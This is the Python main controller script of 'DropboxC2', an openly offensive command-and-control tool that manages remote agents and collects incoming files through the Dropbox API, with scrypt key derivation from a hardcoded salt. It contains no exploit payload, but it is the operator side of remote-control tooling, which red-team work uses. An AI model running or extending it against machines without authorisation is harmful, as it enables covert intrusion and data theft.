#!/usr/bin/python
# -*- coding: utf8 -*-
#
# Author: Arno0x0x - https://twitter.com/Arno0x0x
#
# This tool is distributed under the terms of the [GPLv3 licence](http://www.gnu.org/copyleft/gpl.html)

"""

The main controller for the DropboxC2 agents.

"""
import config as cfg
import getpass
import pyscrypt
import os
from lib import helpers
from lib import console
from lib import dropboxHandler
from lib import statusHandler
from lib import mainHandler
from lib import agentHandler
from lib import pollingThread

# make version and author for DropboxC2
VERSION = "0.2.4"
AUTHOR = "Arno0x0x - https://twitter.com/Arno0x0x"

#****************************************************************************************
# MAIN Program
#****************************************************************************************
if __name__ == '__main__':
	helpers.printBanner()

	print helpers.color("[*] DropboxC2 controller - Author: {} - Version {}".format(AUTHOR, VERSION))

	#------------------------------------------------------------------------------
	# An access token is required to access the Dropbox API. If none is provided in the config file, ask the user to provide one
	if not hasattr(cfg, 'defaultAccessToken'):
		accessToken = ""
	else:
		accessToken = cfg.defaultAccessToken

	if accessToken is "":
		while True:
			accessToken = raw_input("[SETUP] Enter your Dropbox API access token: ")
			if accessToken == "":
				print helpers.color("[!] You must specify a Dropbox API access token. It is a mandatory settings")
			else:
				break
	else:
		print helpers.color("[*][CONFIG] Using Dropbox API access token from configuration file")
	
	#------------------------------------------------------------------------------
	# A master crypto key is required to perform end-to-end encryption of all data exchanged between the agent and the controller.
	# The master crypto key is derived from a user provided password.
	# If no master crypto key is found in the config file, ask the user to provide a password and derive the key from it
	if not hasattr(cfg, 'defaultMasterKey'):
		masterKey = ""
	else:
		masterKey = cfg.defaultMasterKey

	if masterKey is "":
		while True:
			password = getpass.getpass("[SETUP] Enter the master password used to encrypt all data between the agents and the controler: ")
			if password == "":
				print helpers.color("[!] You must specify a master password. It is a mandatory settings")
			else:
				# Derive a 16 bytes (128 bits) master key from the provided password
				masterKey = pyscrypt.hash(password, "saltmegood", 1024, 1, 1, 16)
				print helpers.color("[+] Derived master key from password: [{}]\nYou can save it in the config file to reuse it automatically next time".format(helpers.b64encode(masterKey)))
				break
	else:
		masterKey = helpers.b64decode(masterKey)
		print helpers.color("[*][CONFIG] Using master key from configuration file")
		
	#------------------------------------------------------------------------------
	# Check that required directories and path are available, if not create them
	if not os.path.isdir(cfg.defaultPath['incoming']):
		os.makedirs(cfg.defaultPath['incoming'])
		print helpers.color("[+] Creating [{}] directory for incoming files".format(cfg.defaultPath['incoming']))
	
	#------------------------------------------------------------------------------
	# Create a dropbox handler
	dropboxHandler = dropboxHandler.DropboxHandler(accessToken)

	# Create a status handler
	statusHandler = statusHandler.StatusHandler(masterKey)

	# Create a mainHandler
	mainHandler = mainHandler.MainHandler(dropboxHandler, statusHandler)

	# Create an AgentHandler
	agentHandler = agentHandler.AgentHandler(dropboxHandler, statusHandler)
	
	# Start the main background polling thread
	print helpers.color("[*] Starting Polling thread")
	pollingThread = pollingThread.PollingThread(dropboxHandler, statusHandler)
	pollingThread.doPoll()
	
	# Print the list of discoverd agents
	helpers.printAgentList(statusHandler.agentList)
	
	#--------------------------------------------------------------------------
	# Main command loop
	#--------------------------------------------------------------------------
	mainMenu = console.MainMenu(mainHandler, agentHandler, statusHandler)
	while True:
		try:
			mainMenu.cmdloop()
		#----------------------------------------------------------------------
		# handle ctrl+c's
		except KeyboardInterrupt as e:
			try:
				choice = raw_input(helpers.color("\n[>] Exit? [y/N] ", "red"))
				if choice.lower() != "" and choice.lower()[0] == "y":
					pollingThread.stopPollingThread()
					print helpers.color("[>] Stopping polling thread. Please wait...","red")
					quit()
				else:
					continue
			except KeyboardInterrupt as e:
				continue
